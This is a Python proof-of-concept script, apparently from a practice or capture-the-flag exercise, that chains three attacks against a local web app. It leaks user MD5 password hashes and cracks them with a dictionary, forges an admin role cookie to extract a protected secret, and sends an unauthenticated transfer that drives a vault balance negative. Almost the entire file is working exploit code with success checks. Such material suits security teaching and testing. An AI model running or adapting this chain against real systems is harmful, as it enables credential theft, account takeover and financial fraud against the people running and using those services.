#!/usr/bin/env python3
"""PoC (proven-live step, F-5): full breach - crack + takeover + overdraw.

Stronger than poc1_chain_leak_forge_transfer.py: each chain gadget is
pushed to maximum impact in one unauthenticated run -
  stage1: leak AND crack the credential material (working credentials),
  stage2: forge admin AND extract the protected asset,
  stage3: mutate AND overdraw far past available funds (unbounded theft).
EDUCATIONAL - run against the local practice target only.
Ladder  : in-code -> proven-live (this file). Exit 0 = full breach held.
"""
import hashlib
import json
import sys
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:8765"
SECRET = "SECRET: internal transfer keys"
DICT = ["password", "letmein", "qwerty123", "123456", "admin"]


def stage1_leak_and_crack() -> int:
    with urllib.request.urlopen(BASE + "/api/users") as r:
        users = json.loads(r.read().decode())["users"]
    hits = 0
    for u in users:
        for word in DICT:
            if hashlib.md5(word.encode()).hexdigest() == u["password_hash"]:
                hits += 1
                break
    print(f"[stage1] /api/users leak + dictionary -> {hits}/{len(users)} credential(s) recovered")
    return hits


def stage2_takeover_and_extract() -> str | None:
    req = urllib.request.Request(BASE + "/admin", headers={"Cookie": "role=admin"})
    with urllib.request.urlopen(req) as r:
        body = r.read().decode()
    extracted = SECRET if SECRET in body else None
    print(f"[stage2] forged admin cookie -> secret extracted: {extracted is not None}")
    return extracted


def stage3_overdraw() -> dict:
    data = urllib.parse.urlencode(
        {"from": "vault", "to": "bob", "amount": 100_000_000}
    ).encode()
    req = urllib.request.Request(BASE + "/transfer", data=data, method="POST")
    with urllib.request.urlopen(req) as r:
        resp = json.loads(r.read().decode())
    vault_after = resp["balances"]["vault"]
    print(f"[stage3] unauth transfer 100000000 from vault -> vault now {vault_after}")
    return resp


def main() -> int:
    creds = stage1_leak_and_crack()
    secret = stage2_takeover_and_extract()
    resp = stage3_overdraw()
    ok = (
        creds >= 3
        and secret == SECRET
        and resp["balances"]["vault"] < 0
        and resp["transferred"] == 100_000_000
    )
    if not ok:
        print("FAIL: full breach not achieved")
        return 1
    print(
        "REPRODUCED: one unauthenticated script = working credentials + admin "
        "asset + unbounded theft (all three impacts amplified)"
    )
    print("--- transcript (breach facts) ---")
    print(f"credentials recovered: {creds}; admin asset: extracted; "
          f"vault: driven negative via unauth transfer")
    return 0


if __name__ == "__main__":
    sys.exit(main())
